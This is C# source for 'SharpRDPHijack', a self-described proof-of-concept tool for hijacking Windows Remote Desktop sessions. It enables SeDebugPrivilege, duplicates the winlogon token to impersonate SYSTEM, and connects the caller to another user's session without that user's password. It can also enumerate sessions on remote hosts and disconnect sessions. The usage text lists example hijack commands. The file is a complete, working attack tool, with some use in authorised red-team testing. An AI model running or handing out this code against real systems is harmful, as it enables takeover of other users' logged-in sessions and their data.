using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Diagnostics;

namespace SharpRDPHijack
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                //Quick Arg Parser/Validationr
                int session = -1;
                int receiver = -1;
                string password = "";
                bool console = false;
                bool disconnect = false;
                string tsquery = "";

                foreach (string arg in args)
                {
                    if (arg.StartsWith("--tsquery="))
                        tsquery = arg.Split(new string[] { "--tsquery=" }, StringSplitOptions.None)[1];
                    if (arg.StartsWith("--session="))
                        session = Int32.Parse(arg.Split(new string[] { "--session=" }, StringSplitOptions.None)[1]);
                    if (arg.StartsWith("--password="))
                        password = arg.Split(new string[] { "--password=" }, StringSplitOptions.None)[1];
                    if (arg.StartsWith("--console"))
                        console = true;
                    if (arg.StartsWith("--disconnect"))
                        disconnect = true;
                }

                //if no args, display usage
                if (args.Length < 1)
                    Usage();

                // ------ RDP / TS Session Query...
                if (tsquery.Length > 0)
                {
                    if (args.Length > 1)
                        Console.WriteLine("\n[-] For RDP session query, only use the '--tsquery' switch\n");
                    else
                    {
                        GetTSSessions(tsquery);
                    }
                    Environment.Exit(0);
                }

                // ------ RDP Session Hijack...
                //Session is mandatory - if not selected, display usage
                if (session < 0)
                    Usage();

                //Check if elevated admin
                if (!IsElevatedAdmin())
                {
                    Console.WriteLine("\n[-] For RDP hijack, this program must be run in elevated administrator context\n");
                    Environment.Exit(0);
                }

                //Get active session for redirection (either current session or console (if --console is specified)
                if (console)
                    receiver = Win32.WTSGetActiveConsoleSessionId();
                else
                    receiver = GetActiveSession();

                //If password is not supplied, attempt to impersonate NT AUTHORITY\SYSTEM and connect
                if (password == "")
                {
                    //Adjust (add) SeDebugPrivilege
                    if (!AdjustTokenPrivilege("SeDebugPrivilege"))
                    {
                        Console.WriteLine("\n[-] Could not adjust token privilege: SeDebugPrivilege\n");
                        Environment.Exit(0);
                    }

                    //Impersonate a process with NT AUTHORITY\SYSTEM context
                    //'Winlogon.exe' technique from @monoxgas [https://twitter.com/monoxgas/status/1109892490566336512]
                    string proc = "winlogon";
                    if (!ImpersonateContext(proc))
                    {
                        Console.WriteLine("\n[-] Could not impersonate target context from process: " + proc + "\n");
                        Environment.Exit(0);
                    }
                }

                //Perform WTS action (probably should implement a few guardrails/checks and check for available session but this is handled semi-gracefully)
                int res = -1;
                if (disconnect)
                    res = Win32.WTSDisconnectSession(IntPtr.Zero, session, true);
                else
                    res = Win32.WTSConnectSession(session, receiver, password, true);

                if (res == 0)
                    Console.WriteLine("\n[-] Failed to connect to session: " + session.ToString() + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("\n[-] Error: " + ex.Message.ToString() + "\n");
            }
        }

        static void Usage()
        {
            Console.WriteLine("----------------\nSharp RDP Hijack\n----------------\n");
            Console.WriteLine("[*] A proof-of-concept Remote Desktop (RDP) session hijack utility for disconnected sessions");
            Console.WriteLine("    - For session hijacking, this utility must be run in an elevated context to connect to another session");
            Console.WriteLine("      If a password is not specified, NT AUTHORITY\\SYSTEM is impersonated\n");
            Console.WriteLine("    - For session query, admin privileges may vary depending on target machine\n");
            Console.WriteLine("[*] Parameters: ");
            Console.WriteLine("    --tsquery=<host> : Query a host to identify RDP/TS session information (not required for other switches)");
            Console.WriteLine("    --session=<ID> : Target session identifier");
            Console.WriteLine("    --password=<User's Password> : Session password if known (otherwise optional - not required for disconnect switch)");
            Console.WriteLine("    --console : Redirect session to console session instead of current (active) session");
            Console.WriteLine("    --disconnect : Disconnect an active (remote) session\n");
            Console.WriteLine("[*] Example Usage 1: Impersonate NT AUTHORITY\\SYSTEM to hijack session #6 and redirect to the current session");
            Console.WriteLine("    SharpRDPHijack.exe --session=6\n");
            Console.WriteLine("[*] Example Usage 2: Impersonate NT AUTHORITY\\SYSTEM to hijack session #2 and redirect to the console session");
            Console.WriteLine("    SharpRDPHijack.exe --session=2 --console\n");
            Console.WriteLine("[*] Example Usage 3: Hijack Remote Desktop session #4 with knowledge of the logged-on user's password");
            Console.WriteLine("    SharpRDPHijack.exe --session=4 --password=P@ssw0rd\n");
            Console.WriteLine("[*] Example Usage 4: Disconnect active session #3");
            Console.WriteLine("    SharpRDPHijack.exe --session=3 --disconnect\n");
            Console.WriteLine("[*] Example Usage 5: Query the local host for RDP/TS session information");
            Console.WriteLine("    SharpRDPHijack.exe --tsquery=localhost\n");
            Environment.Exit(0); //not very graceful...
        }

        // --------------------------------------------------------------------------
        // RDP / TS Session Hijack Functions

        //Slightly modified code from James Forshaw's COM Session Moniker EoP Exploit + several P-Invoke definitions [https://www.exploit-db.com/exploits/41607]
        static int GetActiveSession()
        {
            List<int> sids = new List<int>();
            IntPtr pSessions = IntPtr.Zero;
            int dwSessionCount = 0;
            int activeSession = 0;
            try
            {
                if (Win32.WTSEnumerateSessions(IntPtr.Zero, 0, 1, out pSessions, out dwSessionCount))
                {
                    IntPtr current = pSessions;
                    for (int i = 0; i < dwSessionCount; ++i)
                    {
                        Win32.WTS_SESSION_INFO session_info = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure(current, typeof(Win32.WTS_SESSION_INFO));
                        if (session_info.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
                            activeSession = session_info.SessionId;
                        current += Marshal.SizeOf(typeof(Win32.WTS_SESSION_INFO));
                    }
                }
            }
            finally
            {
                if (pSessions != IntPtr.Zero)
                {
                    Win32.WTSFreeMemory(pSessions);
                }
            }
            return activeSession;
        }


        //--------------------- CSharp Elevation/Priv/Impersonation Code. References:
        // https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980
        // https://docs.microsoft.com/en-us/dotnet/api/system.security.principal.windowsprincipal.isinrole?view=dotnet-plat-ext-3.1
        // https://www.pinvoke.net/default.aspx/advapi32.adjusttokenprivileges
        static bool IsElevatedAdmin()
        {
            //Check to see if current identity is admin
            AppDomain myDomain = Thread.GetDomain();
            myDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
            WindowsPrincipal myPrincipal = (WindowsPrincipal)Thread.CurrentPrincipal;
            if (myPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
                return true;
            return false;
        }

        static bool AdjustTokenPrivilege(string priv)
        {
            try
            {
                bool retVal;
                Win32.TokPriv1Luid tp;
                IntPtr hproc = Win32.GetCurrentProcess();
                IntPtr htok = IntPtr.Zero;
                retVal = Win32.OpenProcessToken(hproc, Win32.TOKEN_ALL_ACCESS, out htok);
                tp.Count = 1;
                tp.Luid = 0;
                tp.Attr = Win32.SE_PRIVILEGE_ENABLED;
                retVal = Win32.LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = Win32.AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                return retVal;
            }
            catch
            {
                return false;
            }
        }

        static bool ImpersonateContext(string proc)     //Duplicate token via target process handle
        {
            try
            {
                bool retVal;

                Process[] impProcess = Process.GetProcessesByName(proc);
                Process process = impProcess[0];    //grabs first process - depending on use case, may need to clean up or call by PID instead
                IntPtr procToken = IntPtr.Zero;
                retVal = Win32.OpenProcessToken(process.Handle, Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out procToken);
                IntPtr duplicateTokenHandle = IntPtr.Zero;
                retVal = Win32.DuplicateToken(procToken, 2, out duplicateTokenHandle);
                retVal = Win32.SetThreadToken(IntPtr.Zero, duplicateTokenHandle);
                if (!retVal)
                    return false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // --------------------------------------------------------------------------
        // RDP / TS Session Query Functions

        public static void GetTSSessions(string serverName)
        {
            IntPtr serverHandle = IntPtr.Zero;
            List<string> resultList = new List<string>();
            serverHandle = Win32.WTSOpenServer(serverName);

            try
            {
                IntPtr pSessions = IntPtr.Zero;
                IntPtr userPtr = IntPtr.Zero;
                IntPtr domainPtr = IntPtr.Zero;
                Int32 dwSessionCount = 0;
                bool retVal = Win32.WTSEnumerateSessions(serverHandle, 0, 1, out pSessions, out dwSessionCount);
                Int32 dataSize = Marshal.SizeOf(typeof(Win32.WTS_SESSION_INFO));
                IntPtr currentSession = pSessions;

                //if (retVal != 0)
                if (retVal)
                {
                    for (int i = 0; i < dwSessionCount; i++)
                    {
                        Win32.WTS_SESSION_INFO si = (Win32.WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(Win32.WTS_SESSION_INFO));
                        currentSession += dataSize;

                        //Session Id
                        Console.WriteLine("\nSession ID: " + si.SessionId.ToString());

                        //Session State
                        string state = "Unknown";
                        if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
                            state = "Active";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnected)
                            state = "Connecting";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnectQuery)
                            state = "ConnectQuery";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDisconnected)
                            state = "Disconnected";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDown)
                            state = "Down due to error";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSIdle)
                            state = "Idle and waiting for connection";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSInit)
                            state = "initializing";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSListen)
                            state = "Listening for a connection";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSReset)
                            state = "Resetting a connection";
                        else if (si.State == Win32.WTS_CONNECTSTATE_CLASS.WTSShadow)
                            state = "Shadowing";
                        Console.WriteLine("Session State: " + state);

                        //Session User
                        string username = "";
                        username = GetUsernameBySessionId(serverHandle, si.SessionId);
                        Console.WriteLine("Identity: " + username);

                        Win32.WTSFreeMemory(userPtr);
                        Win32.WTSFreeMemory(domainPtr);
                    }

                    Win32.WTSFreeMemory(pSessions);
                }
                Console.WriteLine("");
            }
            catch (Exception e)
            {
                Console.WriteLine("\n [-] Error: " + e.Message + "\n");
            }
            finally
            {
                Win32.WTSCloseServer(serverHandle);
            }
        }

        //https://www.pinvoke.net/default.aspx/wtsapi32.wtsquerysessioninformation
        static string GetUsernameBySessionId(IntPtr serverHandle, int sessionId)
        {
            IntPtr buffer;
            uint strLen;
            var username = "";
            if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out buffer, out strLen) && strLen > 1)
            {
                username = Marshal.PtrToStringAnsi(buffer); // don't need length as these are null terminated strings
                Win32.WTSFreeMemory(buffer);
                if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out buffer, out strLen) && strLen > 1)
                {
                    username = Marshal.PtrToStringAnsi(buffer) + "\\" + username; // prepend domain name
                    Win32.WTSFreeMemory(buffer);
                }
            }
            return username;
        }

    }
    class Win32
    {
        // ----------------------------------------WTS P-Invoke Definitions
        public enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,              // User logged on to WinStation
            WTSConnected,           // WinStation connected to client
            WTSConnectQuery,        // In the process of connecting to client
            WTSShadow,              // Shadowing another WinStation
            WTSDisconnected,        // WinStation logged on without client
            WTSIdle,                // Waiting for client to connect
            WTSListen,              // WinStation is listening for connection
            WTSReset,               // WinStation is being reset
            WTSDown,                // WinStation is down due to error
            WTSInit,                // WinStation in initialization
        }

        public enum WTS_INFO_CLASS
        {
            WTSInitialProgram,
            WTSApplicationName,
            WTSWorkingDirectory,
            WTSOEMId,
            WTSSessionId,
            WTSUserName,
            WTSWinStationName,
            WTSDomainName,
            WTSConnectState,
            WTSClientBuildNumber,
            WTSClientName,
            WTSClientDirectory,
            WTSClientProductId,
            WTSClientHardwareId,
            WTSClientAddress,
            WTSClientDisplay,
            WTSClientProtocolType
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WTS_SESSION_INFO
        {
            public int SessionId;
            public IntPtr pWinStationName;
            public WTS_CONNECTSTATE_CLASS State;
        }

        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern bool WTSEnumerateSessions(IntPtr hServer, int Reserved, int Version, out IntPtr ppSessionInfo, out int pCount);

        [DllImport("wtsapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern int WTSDisconnectSession(IntPtr hServer, int sessionId, bool bWait);

        [DllImport("kernel32.dll")]
        public static extern int WTSGetActiveConsoleSessionId();

        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern void WTSFreeMemory(IntPtr memory);

        [DllImport("wtsapi32.dll")]
        public static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] string pServerName);

        [DllImport("wtsapi32.dll")]
        public static extern void WTSCloseServer(IntPtr hServer);

        [DllImport("wtsapi32.dll")]
        public static extern bool WTSQuerySessionInformation(IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned);


        // ---------------------------------------- Token Duplication P-Invoke Definitions [https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980 and Goude 2012, TreuSec (http://www.truesec.com )]
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        public const int SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int TOKEN_QUERY = 0x00000008;
        public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID);
        public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
        public const int ANYSIZE_ARRAY = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public UInt32 HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        public struct TOKEN_PRIVILEGES
        {
            public UInt32 PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetThreadToken(IntPtr PHThread, IntPtr Token);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [DllImport("kernel32.dll", ExactSpelling = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    }
}
